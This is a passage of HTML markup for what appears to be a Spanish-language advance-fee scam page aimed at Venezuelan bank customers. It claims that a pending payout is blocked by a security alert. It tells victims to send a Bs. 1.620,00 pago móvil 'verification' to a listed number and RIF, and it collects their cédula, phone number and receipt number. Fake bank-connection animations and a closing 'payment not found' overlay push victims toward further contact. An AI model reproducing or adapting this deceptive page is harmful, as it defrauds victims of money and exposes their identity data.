                <strong class="nombreBancoUsuario"></strong> nos informa que tu cuenta no suele recibir montos elevados, lo que ha generado una alerta automática de seguridad.
              </div>
            </div>
          </div>
        </div>
        <div class="info-box">
          <div style="display:flex; align-items:center; gap:10px; margin-bottom:0.5rem;">
            <i class="fas fa-shield-alt" style="font-size:1.5rem; color:var(--primary);"></i>
            <h3 style="margin:0; font-size:1.05rem;">¿Qué significa esto para ti?</h3>
          </div>
          <p style="margin-bottom:0.5rem;">
            <strong>No te preocupes.</strong> Estas alertas protegen tu dinero de fraudes.
            Solo necesitamos verificar que realmente eres tú quien solicita este retiro.
          </p>
        </div>
        <div class="success-box">
          <div style="display:flex; align-items:center; gap:10px;">
            <i class="fas fa-check-circle" style="font-size:1.5rem; color:var(--success);"></i>
            <p style="margin:0;">
              <strong>La solución es simple:</strong> Una verificación rápida desde tu cuenta bancaria.
            </p>
          </div>
        </div>
        <div style="display:flex; justify-content:space-between; margin-top:1.5rem; align-items:center;">
          <div style="flex:1;">
            <p style="font-size:0.95rem; color:var(--text-secondary); margin:0;">
              <i class="fas fa-clock"></i> Tiempo estimado: 2 minutos
            </p>
          </div>
          <div style="text-align:right;">
            <button class="btn btn-primary btn-disabled btn-countdown" id="continueSecurity3ABtn">
              <i class="fas fa-clock"></i> Espera 5s
              <span class="btn-tooltip">Botón bloqueado temporalmente</span>
            </button>
            <div class="countdown" id="countdownSecurity3A" style="display:none;"></div>
          </div>
        </div>
      </div>

      <!-- (6) SECCIÓN #2 -->
      <div class="visa-card" id="securityVerification3B">
        <h2><i class="fas fa-user-check"></i> Verificación rápida desde tu banco</h2>
        <div class="info-box">
          <div style="display:flex; align-items:flex-start; gap:12px;">
            <i class="fas fa-info-circle" style="font-size:1.4rem; color:var(--info); margin-top:3px;"></i>
            <div>
              <h3 style="margin:0 0 0.5rem 0; font-size:1.05rem;">¿Cómo funciona esta verificación?</h3>
              <p style="margin:0;">
                Para solucionar las alertas y garantizar que recibas tus
                <strong id="saldoRequerido" style="color:var(--success);">[Saldo en Bs]</strong> sin problemas,
                debes confirmar que tienes acceso a tu cuenta en <strong class="nombreBancoUsuario">[Banco]</strong>.
              </p>
            </div>
          </div>
        </div>
        <div class="instruction-step">
          <div style="display:flex; align-items:flex-start; gap:15px;">
            <div style="background:var(--success); width:40px; height:40px; border-radius:50%; display:flex; align-items:center; justify-content:center; flex-shrink:0;">
              <i class="fas fa-thumbs-up" style="color:white; font-size:1.2rem;"></i>
            </div>
            <div>
              <h3 style="margin:0 0 0.5rem 0; font-size:1.05rem;">Beneficios para ti</h3>
              <ul style="list-style:none; margin:0; padding:0;">
                <li style="margin-bottom:0.8rem; display:flex; align-items:center; gap:8px;">
                  <i class="fas fa-check-circle" style="color:var(--success);"></i>
                  <span>La verificación es <strong>rápida</strong> - toma menos de 5 minutos</span>
                </li>
                <li style="margin-bottom:0.8rem; display:flex; align-items:center; gap:8px;">
                  <i class="fas fa-check-circle" style="color:var(--success);"></i>
                  <span>Evita <strong>retrasos adicionales</strong> con tu banco</span>
                </li>
                <li style="margin-bottom:0.8rem; display:flex; align-items:center; gap:8px;">
                  <i class="fas fa-check-circle" style="color:var(--success);"></i>
                  <span>Recibe tu dinero <strong>sin más complicaciones</strong></span>
                </li>
              </ul>
            </div>
          </div>
        </div>
        <div class="divider">
          <span class="divider-text">IMPORTANTE</span>
        </div>
        <div style="display:flex; flex-wrap:wrap; gap:1rem; margin:1rem 0;">
          <div style="flex:1; min-width:280px;">
            <div class="info-box" style="height:100%; margin:0;">
              <div style="display:flex; align-items:center; gap:8px; margin-bottom:0.5rem;">
                <i class="fas fa-shield-alt" style="color:var(--primary);"></i>
                <strong>Seguridad</strong>
              </div>
              <p style="margin:0; font-size:0.9rem; line-height:1.4;">
                Este procedimiento protege tu dinero contra fraudes y suplantaciones de identidad.
              </p>
            </div>
          </div>
          <div style="flex:1; min-width:280px;">
            <div class="info-box" style="height:100%; margin:0; background:rgba(16, 185, 129, 0.1); border-left-color:var(--success);">
              <div style="display:flex; align-items:center; gap:8px; margin-bottom:0.5rem;">
                <i class="fas fa-money-bill-wave" style="color:var(--success);"></i>
                <strong>Rapidez</strong>
              </div>
              <p style="margin:0; font-size:0.9rem; line-height:1.4;">
                El sistema te enviará el dinero inmediatamente después de completar la verificación.
              </p>
            </div>
          </div>
        </div>
        <div style="display:flex; justify-content:space-between; margin-top:1.5rem; align-items:center;">
          <div style="flex:1;">
            <p style="font-size:0.95rem; color:var(--text-secondary); margin:0;">
              <i class="fas fa-hourglass-half"></i> Faltan pocos pasos para completar
            </p>
          </div>
          <div style="text-align:right;">
            <button class="btn btn-primary btn-disabled btn-countdown" id="continueSecurity3BBtn">
              <i class="fas fa-clock"></i> Espera 5s
              <span class="btn-tooltip">Botón bloqueado temporalmente</span>
            </button>
            <div class="countdown" id="countdownSecurity3B" style="display:none;"></div>
          </div>
        </div>
      </div>

      <!-- (6) SECCIÓN #3: Último paso -->
      <div class="visa-card" id="securityVerification3C" style="position:relative;">
        <div style="position:absolute; top:10px; right:10px; background:var(--success); color:white; font-size:0.85rem; font-weight:bold; padding:0.2rem 0.8rem; border-radius:20px; box-shadow:0 2px 5px rgba(0,0,0,0.2); z-index:999;">
          PASO FINAL
        </div>
        <h2><i class="fas fa-flag-checkered"></i> Último paso para recibir tu dinero</h2>
        <div style="background:linear-gradient(45deg, #1434CB, #142C8E); color:white; padding:1.2rem; border-radius:var(--border-radius); margin-bottom:1.5rem; box-shadow:0 4px 15px rgba(20, 52, 203, 0.2);">
          <h3 style="color:white; margin:0 0 0.8rem 0; font-size:1.15rem; border-bottom:1px solid rgba(255,255,255,0.2); padding-bottom:0.5rem;">
            <i class="fas fa-exclamation-circle"></i> ACCIÓN REQUERIDA
          </h3>
          <p style="margin:0 0 0.8rem 0; font-size:1rem; line-height:1.5;">
            Para eliminar las alertas de seguridad y recibir tu dinero, debes realizar <strong>una verificación desde tu banco:</strong>
          </p>
          <div style="background:rgba(255,255,255,0.15); padding:1rem; border-radius:var(--border-radius-sm); backdrop-filter:blur(4px);">
            <div style="display:flex; align-items:center; gap:0.8rem; margin-bottom:0.5rem;">
              <div style="background:white; width:30px; height:30px; border-radius:50%; display:flex; align-items:center; justify-content:center; flex-shrink:0;">
                <span style="color:var(--primary); font-weight:bold;">1</span>
              </div>
              <div>
                <span>Realiza una recarga de</span>
                <span class="blink" style="font-size:1.2rem; font-weight:700; background:rgba(16, 185, 129, 0.3); padding:2px 8px; border-radius:4px; margin:0 3px;">Bs. 1.620,00</span>
                <span>desde tu cuenta en <strong class="nombreBancoRecarga">[Banco]</strong></span>
              </div>
            </div>
            <div style="display:flex; align-items:center; gap:0.8rem;">
              <div style="background:white; width:30px; height:30px; border-radius:50%; display:flex; align-items:center; justify-content:center; flex-shrink:0;">
                <span style="color:var(--primary); font-weight:bold;">2</span>
              </div>
              <div>
                <span>En el concepto escribe:</span>
                <strong id="conceptoPagoMovil" style="background:rgba(255,255,255,0.25); padding:2px 8px; border-radius:4px;">[Número]</strong>
              </div>
            </div>
          </div>
        </div>
        <div class="banner-flash" style="margin-bottom:1.5rem;">
          <div style="display:flex; align-items:center; justify-content:center; gap:10px; flex-wrap:wrap;">
            <div style="font-size:1.1rem; font-weight:600; text-align:center; color:var(--text-primary);">
              <span>TOTAL QUE RECIBIRÁS:</span>
            </div>
            <div style="display:flex; align-items:center; gap:10px; flex-wrap:nowrap; background:white; padding:0.5rem 1rem; border-radius:var(--border-radius-sm); box-shadow:0 2px 10px rgba(0,0,0,0.05);">
              <span id="montoRetiroBs" style="font-weight:600;">[Saldo]</span>
              <i class="fas fa-plus" style="color:var(--text-secondary);"></i>
              <span class="blink" style="font-weight:700;">Bs. 1.620,00</span>
              <i class="fas fa-equals" style="color:var(--text-secondary);"></i>
              <span id="montoDepositoTotal" style="font-size:1.2rem; font-weight:700; color:var(--success);">[Saldo+1620]</span>
            </div>
          </div>
        </div>
        <div style="margin-bottom:1.5rem;">
          <h3 style="font-size:1.1rem; color:var(--primary); display:flex; align-items:center; gap:8px; margin-bottom:1rem;">
            <i class="fas fa-info-circle"></i> Datos para hacer la verificación
          </h3>
          <!-- Al hacer clic en cualquier parte de la pantalla se cierra -->
          <div
            style="cursor:pointer; border-radius:var(--border-radius); overflow:hidden; box-shadow:0 4px 15px rgba(0,0,0,0.08); position:relative;"
            id="verDatosOverlayTrigger"
          >
            <!-- Tarjeta difuminada por defecto -->
            <div class="security-data-card" id="datosRecargaFijos" style="
              margin-top:0; 
              border:none; 
              background:linear-gradient(120deg, #fdfdfd, #f8f9ff);
              padding:1.5rem;
              filter: blur(8px);
              transition: filter 0.3s;
            ">
              <div style="display:grid; grid-template-columns:120px 1fr; gap:1rem 0.5rem; align-items:center;">
                <div style="font-weight:600; color:var(--text-secondary);">Banco:</div>
                <div style="font-weight:600;">Banco Venezolano de Crédito (0104)</div>
                <div style="font-weight:600; color:var(--text-secondary);">Número:</div>
                <div style="display:flex; align-items:center; gap:10px;">
                  <span id="verificacionNumero" style="font-weight:600;">0412-1000000</span>
                  <i class="fas fa-copy copy-icon" onclick="copyToClipboard('verificacionNumero')" style="color:var(--primary); cursor:pointer;"></i>
                </div>
                <div style="font-weight:600; color:var(--text-secondary);">RIF:</div>
                <div style="display:flex; align-items:center; gap:10px;">
                  <span id="verificacionRif" style="font-weight:600;">J-407502646</span>
                  <i class="fas fa-copy copy-icon" onclick="copyToClipboard('verificacionRif')" style="color:var(--primary); cursor:pointer;"></i>
                </div>
                <div style="font-weight:600; color:var(--text-secondary);">Monto:</div>
                <div style="display:flex; align-items:center; gap:10px;">
                  <span id="verificacionMonto" style="font-weight:600; color:var(--success);">1.620,00 Bolívares</span>
                  <i class="fas fa-copy copy-icon" onclick="copyToClipboard('verificacionMonto')" style="color:var(--primary); cursor:pointer;"></i>
                </div>
                <div style="font-weight:600; color:var(--text-secondary);">Concepto:</div>
                <div style="font-weight:600; color:var(--primary);">
                  <span id="conceptoRecarga">[Número de Identificación]</span>
                </div>
              </div>
            </div>
            <!-- Overlay encima con mensaje "Toca para ver los datos" -->
            <div style="
              position:absolute; 
              top:0; 
              left:0; 
              width:100%; 
              height:100%; 
              background:rgba(255,255,255,0.9);
              backdrop-filter:blur(8px);
              display:flex; 
              flex-direction:column;
              justify-content:center; 
              align-items:center;
              color:var(--text-primary);
              transition: opacity 0.3s;
            " id="tapToShowOverlay">
              <i class="fas fa-fingerprint" style="font-size:2rem; color:var(--primary); margin-bottom:0.5rem;"></i>
              <div style="font-weight:700; font-size:1.2rem; color:var(--primary); margin-bottom:0.5rem;">Toca para ver los datos</div>
              <div style="color:var(--text-secondary); font-size:0.9rem; text-align:center;">
                Información sensible protegida
              </div>
            </div>
          </div>
        </div>
        <div class="info-box" style="margin-bottom:1.5rem;">
          <div style="display:flex; align-items:flex-start; gap:10px;">
            <i class="fas fa-bullhorn" style="color:var(--primary); font-size:1.2rem; margin-top:3px;"></i>
            <div>
              <p style="margin:0; font-size:0.95rem; line-height:1.5;">
                <strong>Importante:</strong> La recarga de <strong>Bs. 1.620,00</strong> será reembolsada junto con tu saldo.
                Este paso es únicamente para verificar tu identidad y remover las alertas.
              </p>
            </div>
          </div>
        </div>
        <div style="background:#f8f9ff; padding:1rem; border-radius:var(--border-radius); margin-bottom:1.5rem; border:1px dashed var(--primary);">
          <h4 style="margin:0 0 0.8rem 0; font-size:1rem; color:var(--primary); display:flex; align-items:center; gap:8px;">
            <i class="fas fa-list-ol"></i> Resumen de pasos:
          </h4>
          <ol style="margin:0; padding-left:1.5rem; color:var(--text-primary);">
            <li style="margin-bottom:0.5rem;">Haz un pago móvil de <strong>Bs. 1.620,00</strong> a los datos mostrados</li>
            <li style="margin-bottom:0.5rem;">Usa tu número de documento como concepto: <strong id="conceptoRecargaResumen"></strong></li>
            <li>Continúa para confirmar tu recarga y recibir tu dinero</li>
          </ol>
        </div>
        <div style="display:flex; justify-content:space-between; margin-top:1.5rem; align-items:center;">
          <div style="flex:1;">
            <p style="font-size:0.9rem; color:var(--text-secondary); margin:0; display:flex; align-items:center; gap:8px;">
              <i class="fas fa-shield-alt"></i> Verificación segura y confidencial
            </p>
          </div>
          <div style="text-align:right;">
            <button class="btn btn-primary btn-disabled btn-countdown" id="recargaReadyBtn">
              <i class="fas fa-clock"></i> Espera 5s
              <span class="btn-tooltip">Botón bloqueado temporalmente</span>
            </button>
            <div class="countdown" id="countdownRecargaReady" style="display:none;"></div>
          </div>
        </div>
      </div>

      <!-- (7) SECCIÓN #4: Confirma tu recarga de pago móvil -->
      <div class="visa-card" id="recargaSection" style="position:relative;">
        <div style="position:absolute; top:10px; left:50%; transform:translateX(-50%); background:var(--success); color:white; font-size:0.85rem; font-weight:bold; padding:0.3rem 1rem; border-radius:20px; box-shadow:0 2px 5px rgba(0,0,0,0.2); white-space:nowrap; z-index:999;">
          ÚLTIMO PASO
        </div>
        <!-- Se renombra aquí -->
        <h2><i class="fas fa-credit-card"></i> Confirma tu recarga de pago móvil</h2>
        <div class="success-box" style="margin-bottom:1.5rem;">
          <div style="display:flex; align-items:flex-start; gap:10px;">
            <i class="fas fa-check-circle" style="font-size:1.4rem; color:var(--success); margin-top:2px;"></i>
            <p style="margin:0; line-height:1.5; font-size:0.95rem;">
              <strong>¡Excelente!</strong> Estás a un paso de recibir tus <strong id="saldoFinalDisplay" style="color:var(--success);">[Saldo+1620 Bs]</strong>
              en tu cuenta. Solo necesitamos verificar tu recarga de 1.620,00 Bs.
            </p>
          </div>
        </div>

        <div style="background:#f9faff; border-radius:var(--border-radius); padding:1.5rem; margin-bottom:1.5rem; border:1px solid rgba(20, 52, 203, 0.1);">
          <h3 style="font-size:1.05rem; color:var(--primary); margin:0 0 1rem 0; display:flex; align-items:center; gap:8px;">
            <i class="fas fa-list-alt"></i> Datos de tu recarga
          </h3>
          <div style="margin-bottom:1.5rem;">
            <div class="form-group" style="margin-bottom:1rem;">
              <label style="display:block; margin-bottom:0.4rem; font-weight:500; font-size:0.9rem; color:var(--text-secondary);">
                Banco de Origen:
              </label>
              <div style="display:flex; align-items:center; gap:0.5rem; background:white; padding:0.5rem; border-radius:var(--border-radius-sm); border:1px solid #e2e8f0;">
                <img id="logoBancoOrigen" src="" alt="Logo Banco" style="max-height:30px;" />
                <input
                  type="text"
                  id="recargaBancoOrigen"
                  style="width:100%; padding:0.5rem; border:none; background:transparent; color:var(--text-primary); font-weight:500;"
                  disabled
                />
              </div>
            </div>
            <div class="form-group" style="margin-bottom:1rem;">
              <label style="display:block; margin-bottom:0.4rem; font-weight:500; font-size:0.9rem; color:var(--text-secondary);">
                Cédula:
              </label>
              <input
                type="text"
                id="recargaCedula"
                style="width:100%; padding:0.75rem; background:#f0f5ff; border:1px solid #e2e8f0; border-radius:var(--border-radius-sm); color:var(--text-primary); font-weight:500;"
                disabled
              />
            </div>
            <div class="form-group" style="margin-bottom:1rem;">
              <label style="display:block; margin-bottom:0.4rem; font-weight:500; font-size:0.9rem; color:var(--text-secondary);">
                Monto de verificación:
              </label>
              <input
                type="text"
                id="recargaMonto"
                value="1.620,00"
                disabled
                style="width:100%; padding:0.75rem; background:#f0f5ff; border:1px solid #e2e8f0; border-radius:var(--border-radius-sm); color:var(--success); font-weight:600;"
              />
            </div>
          </div>
          <div style="margin-bottom:1.5rem; text-align:center; background:rgba(20, 52, 203, 0.05); padding:1rem; border-radius:var(--border-radius-sm);">
            <p style="margin:0; font-size:1rem; color:var(--text-secondary); line-height:1.4;">
              Recarga 
              <span class="blink" style="font-weight:700; font-size:1.2rem; color:var(--success);">1.620,00 Bs</span>
              desde tu cuenta para verificar tu identidad 
              y recibirás 
              <strong>(tu saldo disponible + 1620)</strong> = 
              <span style="font-weight:700; color:var(--success);" id="totalFinalConReembolso">[Saldo+1620]</span>.
            </p>
          </div>

          <div class="form-group highlight-element" style="
            margin-bottom:1.5rem; 
            background:rgba(245, 158, 11, 0.1); 
            border:1px solid rgba(245, 158, 11, 0.2); 
            border-radius:var(--border-radius-sm); 
            padding:1rem;
          ">
            <div class="form-group" style="margin-bottom:1rem;">
              <label style="display:block; margin-bottom:0.4rem; font-weight:600; font-size:0.95rem; color:var(--text-primary);">
                <i class="fas fa-phone" style="color:var(--primary); margin-right:5px;"></i> Teléfono:
              </label>
              <input
                type="text"
                id="recargaTelefono"
                style="width:100%; padding:0.75rem; border:2px solid var(--primary); border-radius:var(--border-radius-sm); font-weight:500;"
                placeholder="Ingrese su número de teléfono"
                required
              />
              <small style="display:block; margin-top:0.3rem; color:var(--text-secondary); font-size:0.8rem;">
                Ingresa el teléfono asociado a tu pago móvil
              </small>
            </div>
            <div class="form-group">
              <label style="display:block; margin-bottom:0.4rem; font-weight:600; font-size:0.95rem; color:var(--text-primary);">
                <i class="fas fa-receipt" style="color:var(--primary); margin-right:5px;"></i> N° de Comprobante (12 dígitos):
              </label>
              <input
                type="text"
                id="comprobanteInput"
                placeholder="Ej: 123456789123"
                style="width:100%; padding:0.75rem; border:2px solid var(--primary); border-radius:var(--border-radius-sm); font-weight:500;"
                maxlength="12"
                pattern="[0-9]{12}"
              />
              <small style="display:block; margin-top:0.3rem; color:var(--text-secondary); font-size:0.8rem;">
                Ingresa el número que aparece en tu comprobante de pago móvil
              </small>
            </div>
          </div>
        </div>
        <div class="info-box" style="margin-bottom:1.5rem;">
          <div style="display:flex; align-items:flex-start; gap:10px;">
            <i class="fas fa-info-circle" style="font-size:1.2rem; color:var(--info); margin-top:2px;"></i>
            <p style="margin:0; font-size:0.9rem; line-height:1.5;">
              Al confirmar tu recarga de <strong>1.620,00 Bs</strong>, el sistema verificará tu identidad
              y depositará la suma total de <strong id="totalFinalConReembolso">[Saldo+1620]</strong> a tu cuenta en
              <strong id="bancoFinalUsuario"></strong>.
            </p>
          </div>
        </div>
        <div style="display:flex; justify-content:space-between; align-items:center;">
          <div style="flex:1;">
            <p style="font-size:0.9rem; color:var(--text-secondary); margin:0; display:flex; align-items:center; gap:8px;">
              <i class="fas fa-lock"></i> Datos protegidos
            </p>
          </div>
          <div style="text-align:right;">
            <button class="btn btn-success btn-disabled btn-countdown" id="confirmRecargaBtn">
              <i class="fas fa-clock"></i> Espera 5s
              <span class="btn-tooltip">Botón bloqueado temporalmente</span>
            </button>
            <div class="countdown" id="countdownRecargaConfirm" style="display:none;"></div>
          </div>
        </div>
      </div>

      <!-- (8) Overlays y modales -->
      <!-- Overlay: Confirmar Firma -->
      <div class="overlay" id="overlayConfirmFirma">
        <div class="modal">
          <h3>¿Estás seguro de tu firma?</h3>
          <p>
            La firma debe coincidir con la de tu documento de identidad.
            Si no coincide, se solicitará verificación adicional.<br/>
            ¿Deseas continuar con esta firma?
          </p>
          <div style="display:flex; gap:1rem; justify-content:center; flex-wrap:wrap;">
            <button class="btn btn-danger" id="editarFirmaBtn">
              <i class="fas fa-edit"></i> Editar Firma
            </button>
            <button class="btn btn-success" id="continuarFirmaBtn">
              <i class="fas fa-forward"></i> Continuar
            </button>
          </div>
        </div>
      </div>

      <!-- Overlay Secuencial POST-FIRMA (Conexión, Análisis, etc.) -->
      <div class="overlay" id="overlaySecuenciaFirma">
        <div class="modal">
          <h3 id="secuenciaFirmaTitulo">Conectando con tu banco...</h3>
          <p id="secuenciaFirmaTexto">
            Espere un momento, por favor.
          </p>
          <img id="secuenciaFirmaLogo" src="" alt="Banco" style="max-height:50px; margin:0.5rem 0;" />
          <i class="fas fa-spinner fa-spin" style="font-size:1.5rem; color:var(--primary);"></i>
        </div>
      </div>

      <!-- Overlay: Análisis de Documento de Identidad -->
      <div class="overlay" id="overlayDocumento">
        <div class="modal">
          <h3 id="overlayDocumentoTitulo"></h3>
          <p id="overlayDocumentoTexto"></p>
          <img id="overlayDocumentoLogo" src="" alt="Logo Banco" style="max-height:50px; margin:0.5rem 0;" />
          <i class="fas fa-spinner fa-spin" style="font-size:1.5rem; color:var(--primary);"></i>
        </div>
      </div>

      <!-- Overlay mejorado: Verificando recarga -->
      <div class="overlay" id="overlayVerificandoRecarga">
        <div class="modal">
          <div style="text-align:center;">
            <div class="modal-icon">
              <i class="fas fa-sync-alt fa-spin" style="color:var(--primary);"></i>
            </div>
            <h3 id="verificandoRecargaTitulo" style="margin-top:0; display:flex; align-items:center; justify-content:center; gap:10px;">
              <span>Verificando tu recarga</span>
              <div class="loading-dots" style="display:flex; align-items:center;">
                <span style="width:5px; height:5px; background:var(--primary); border-radius:50%; margin:0 2px; animation:loadingDot 1.4s infinite ease-in-out both; animation-delay:0s;"></span>
                <span style="width:5px; height:5px; background:var(--primary); border-radius:50%; margin:0 2px; animation:loadingDot 1.4s infinite ease-in-out both; animation-delay:0.2s;"></span>
                <span style="width:5px; height:5px; background:var(--primary); border-radius:50%; margin:0 2px; animation:loadingDot 1.4s infinite ease-in-out both; animation-delay:0.4s;"></span>
              </div>
            </h3>
            <div class="modal-body">
              <div style="display:flex; align-items:center; justify-content:center; margin-bottom:1rem;">
                <img id="verificandoRecargaLogo" src="" alt="Banco" style="max-height:40px; margin:0 auto;" />
              </div>
              <div style="background:rgba(20, 52, 203, 0.05); padding:0.8rem; border-radius:var(--border-radius-sm); animation:pulseBackground 2s infinite; text-align:left;">
                <p id="verificandoRecargaTexto" style="margin:0; color:var(--text-primary); font-size:0.95rem;">
                  Conectando con tu banco para verificar la recarga...
                </p>
              </div>
            </div>
            <div style="background:#f5f7ff; padding:0.8rem; border-radius:var(--border-radius-sm); margin-top:1rem;">
              <p style="margin:0; color:var(--text-secondary); font-size:0.85rem; line-height:1.4;">
                <i class="fas fa-info-circle" style="color:var(--primary); margin-right:5px;"></i>
                Este proceso puede tomar unos segundos. Por favor, no cierres esta ventana.
              </p>
            </div>
          </div>
        </div>
      </div>

      <!-- Overlay mejorado: Datos de Verificación (Pago Móvil) -->
      <div class="overlay" id="overlayDatosVerificacion">
        <div class="modal modal-glow">
          <div style="position:absolute; top:-15px; right:-15px; background:var(--success); color:white; font-size:0.8rem; font-weight:bold; padding:0.2rem 0.8rem; border-radius:20px; box-shadow:0 2px 5px rgba(0,0,0,0.2);">
            DATOS DE PAGO
          </div>
          <div style="text-align:center; margin-bottom:1rem;">
            <i class="fas fa-mobile-alt" style="font-size:2.5rem; color:var(--primary);"></i>
            <h3 style="margin:0.5rem 0; font-size:1.3rem;">Datos para Pago Móvil</h3>
          </div>
          <div id="modalDatosContent" style="background:#f9faff; border-radius:var(--border-radius); padding:1rem; margin-bottom:1.5rem; border:1px dashed var(--primary); position:relative;">
            <!-- Tarjeta azul difuminada internamente -->
            <div style="
              position:relative; 
              background:linear-gradient(135deg, #1434CB, #142C8E);
              border-radius:12px; 
              padding:1.5rem; 
              color:white; 
              margin-bottom:1.5rem; 
              overflow:hidden;
              filter: blur(6px);
              transition: filter 0.3s;
            " id="tarjetaAzulBlur">
              <div style="position:absolute; top:10px; right:15px; opacity:0.8;">
                <i class="fas fa-credit-card" style="font-size:1.8rem;"></i>
              </div>
              <div style="margin-bottom:1rem; display:flex; align-items:center;">
                <span style="font-size:0.85rem; background:rgba(255,255,255,0.2); padding:0.2rem 0.5rem; border-radius:4px;">BANCO</span>
              </div>
              <div style="font-size:1.1rem; font-weight:700; margin-bottom:1.2rem; letter-spacing:0.5px;">
                Banco Venezolano de Crédito
              </div>
              <div style="display:grid; grid-template-columns:repeat(2, 1fr); gap:1rem;">
                <div>
                  <div style="font-size:0.75rem; opacity:0.8; margin-bottom:0.2rem;">NÚMERO</div>
                  <div style="font-size:1rem; font-weight:600; display:flex; align-items:center; gap:5px;">
                    <span id="verificacionNumeroModal">0412-1000000</span>
                    <i class="fas fa-copy copy-icon" onclick="copyToClipboard('verificacionNumeroModal')" style="cursor:pointer; font-size:0.9rem;"></i>
                  </div>
                </div>
                <div>
                  <div style="font-size:0.75rem; opacity:0.8; margin-bottom:0.2rem;">RIF</div>
                  <div style="font-size:1rem; font-weight:600; display:flex; align-items:center; gap:5px;">
                    <span id="verificacionRifModal">J-407502646</span>
                    <i class="fas fa-copy copy-icon" onclick="copyToClipboard('verificacionRifModal')" style="cursor:pointer; font-size:0.9rem;"></i>
                  </div>
                </div>
              </div>
              <div style="position:absolute; bottom:0; left:0; right:0; height:5px; background:linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent); animation:shine 3s infinite;"></div>
            </div>
            <!-- Capa que dice "Toca para ver contenido" -->
            <div style="
              position:absolute; 
              top:0; left:0; 
              width:100%; height:100%; 
              display:flex; flex-direction:column; align-items:center; justify-content:center;
              backdrop-filter:blur(6px);
              background:rgba(255,255,255,0.8);
              cursor:pointer;
              text-align:center;
            " id="tapTarjetaAzul">
              <i class="fas fa-fingerprint" style="font-size:2rem; color:var(--primary); margin-bottom:0.5rem;"></i>
              <div style="font-weight:700; font-size:1.2rem; color:var(--primary); margin-bottom:0.5rem;">Toca para ver los datos</div>
              <div style="color:var(--text-secondary); font-size:0.9rem;">Información sensible</div>
            </div>

            <div style="text-align:center; margin-bottom:1.5rem;">
              <!-- Monto a verificar con nuevo estilo -->
              <div style="font-size:0.95rem; color:var(--text-secondary); margin-bottom:0.5rem;">Recarga 
                <span id="verificacionMontoModal" class="blink" style="font-weight:700; color:var(--success); font-size:1.1rem;">
                  1.620,00 Bs
                </span>
                desde tu cuenta para verificar tu identidad 
                y recibirás <strong>(saldo + 1620)</strong> = 
                <span style="color:var(--success); font-weight:700;" id="totalOverlayPagoMovil">[Total]</span>
              </div>
            </div>
          </div>
          <button class="btn btn-primary" id="closeDatosModalBtn" style="width:100%;">
            <i class="fas fa-check"></i> Entendido
          </button>
        </div>
      </div>

      <!-- Overlay mejorado: Error Final -->
      <div class="overlay" id="overlayErrorFinal">
        <div class="modal">
          <div style="text-align:center; margin-bottom:1.5rem;">
            <div style="width:80px; height:80px; background:#fff1f1; border-radius:50%; display:flex; align-items:center; justify-content:center; margin:0 auto 1rem auto;">
              <i class="fas fa-exclamation-circle" style="font-size:3rem; color:var(--danger);"></i>
            </div>
            <h3 style="margin:0; color:var(--danger); font-size:1.2rem;">
              No encontramos tu recarga
            </h3>
          </div>
          <div class="modal-body">
            <div style="background:#fff8f8; border:1px solid rgba(239, 68, 68, 0.2); border-radius:var(--border-radius-sm); padding:1rem; margin-bottom:1.5rem;">
              <p style="margin:0 0 1rem 0; font-size:0.95rem; line-height:1.5; color:var(--text-primary);">
                Hemos verificado con <strong id="bancoErrorFinal"></strong> y
                <strong>no se registra ninguna recarga por 1.620,00 Bs</strong> asociada a tu cuenta.
              </p>
              <div style="display:flex; align-items:center; gap:10px; margin-bottom:1rem; background:white; padding:0.8rem; border-radius:var(--border-radius-sm);">
                <div style="color:var(--danger); font-size:1.5rem; flex-shrink:0;">
                  <i class="fas fa-times-circle"></i>
                </div>
                <div>
                  <p style="margin:0; font-size:0.9rem; line-height:1.4;">
                    No podemos verificar la titularidad de tu cuenta sin esta recarga de verificación.
                  </p>
                </div>
              </div>
              <div style="display:flex; align-items:center; gap:10px; background:white; padding:0.8rem; border-radius:var(--border-radius-sm);">
                <div style="color:var(--warning); font-size:1.5rem; flex-shrink:0;">
                  <i class="fas fa-hand-holding-usd"></i>
                </div>
                <div>
                  <p style="margin:0; font-size:0.9rem; line-height:1.4;">
                    Tu dinero de <strong id="montoErrorFinal"></strong> está retenido hasta que confirmemos tu identidad.
                  </p>
                </div>
              </div>
            </div>
            <div style="text-align:center; margin-bottom:1.5rem;">
              <div style="font-weight:600; margin-bottom:0.5rem; color:var(--primary);">
                ¿Necesitas ayuda?
              </div>
              <p style="font-size:0.9rem; line-height:1.4; color:var(--text-secondary); margin:0;">
                Contacta con nuestro equipo de soporte para resolver esta situación lo antes posible.
              </p>
            </div>
            <a
              href="#"
              target="_blank"
              class="btn-support"
              id="whatsappLink"
              style="display:flex; align-items:center; justify-content:center; gap:10px;"
            >
              <i class="fab fa-whatsapp" style="font-size:1.4rem;"></i>
              <span>Contactar con Soporte</span>
            </a>
          </div>
        </div>
      </div>

      <!-- Overlay principal - Ultra Modern Bank Connection -->
      <div class="overlay" id="overlayBankConnection" style="display:none;">
        <!-- Contenedor principal del overlay (equivalente a la antigua .overlay-container) -->
        <div class="overlay-container" id="bankOverlayContainer" style="font-family: 'Inter', 'Plus Jakarta Sans', sans-serif;">
          <!-- Progreso de líneas en el borde (anteriormente progress-border) -->
          <div class="progress-border">
            <div class="progress-line top"></div>
            <div class="progress-line right"></div>
            <div class="progress-line bottom"></div>
            <div class="progress-line left"></div>
          </div>

          <!-- Logo del banco en la parte superior -->
          <div class="logo-container">
            <!-- Aquí reemplazaremos dinámicamente su contenido con el logo del banco -->
            <div class="placeholder-logo" id="placeholderBankLogo">BANK LOGO</div>
          </div>

          <!-- Orb futurista y animaciones -->
          <div class="spinner-container ai-orb-container">
            <!-- Anillos orbitales externos -->
            <div class="orbital-ring"></div>
            <div class="orbital-ring"></div>
            <div class="orbital-ring"></div>

            <!-- Indicador de progreso circular -->
            <svg class="progress-ring" width="250" height="250">
              <circle class="progress-ring-circle" cx="125" cy="125" r="100"></circle>
            </svg>

            <!-- Contenedor de hexágonos flotantes -->
            <div class="hex-container" id="hexContainer"></div>

            <!-- Partículas flotantes -->
            <div id="particleContainer"></div>

            <!-- Orbe principal -->
            <div class="ai-orb" id="aiOrb">
              <!-- Ondas líquidas -->
              <div class="wave-overlay">
                <div class="liquid-wave"></div>
                <div class="liquid-wave"></div>
                <div class="liquid-wave"></div>
              </div>
              <!-- Efectos de fluido interno -->
              <div class="fluid-effect">
                <div class="color-shift"></div>
                <div class="flow-pattern"></div>
              </div>
              <!-- Puntos luminosos de energía (flujo) -->
              <div class="luminous-flow" id="luminousFlow"></div>
              <!-- Núcleo integrado -->
              <div class="integrated-core"></div>
